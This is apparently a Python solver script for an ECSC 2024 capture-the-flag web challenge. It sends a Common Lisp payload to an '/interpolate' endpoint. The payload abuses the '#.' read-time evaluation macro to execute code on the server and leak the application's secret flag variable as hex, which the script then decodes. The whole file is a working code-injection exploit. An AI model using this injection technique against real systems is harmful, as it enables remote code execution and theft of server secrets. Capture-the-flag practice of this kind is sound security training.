#!/usr/bin/env python3

import logging
import os

import requests

logging.disable()

URL = os.environ.get("URL", "http://fuperfiberneticinterpolator.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

PAYLOAD = '''
    (:template "{hexflag}"
     :substitutions ((:hexflag . #.(format nil "~{~A~}"
                                     (map 'list
                                          (lambda (c)
                                            (write-to-string (char-code c) :base 16))
                                          app.web::*flag*)))))
'''
r = requests.post(f"{URL}/interpolate", data=PAYLOAD)
r.raise_for_status()

print(bytes.fromhex(r.text).decode())
